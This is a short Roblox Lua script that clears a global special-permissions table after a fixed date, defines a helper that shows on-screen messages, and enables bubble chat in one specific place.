local timelimit = "2025-08-30"
local ctime = os.date("%Y-%m-%d")

if ctime > timelimit then
    _G.specialperms = {}
end

_G.prn = function(toprint, time)
    local p = Instance.new("Message")
    p.Parent = workspace
    p.Text = tostring(toprint)

    time = time or 3
    game:GetService("Debris"):AddItem(p,time)
end

if game.PlaceId == 14747334292 then -- temporarily testing something related to age groups
    task.wait(5) 
    game.TextChatService.BubbleChatConfiguration.Enabled = true
end

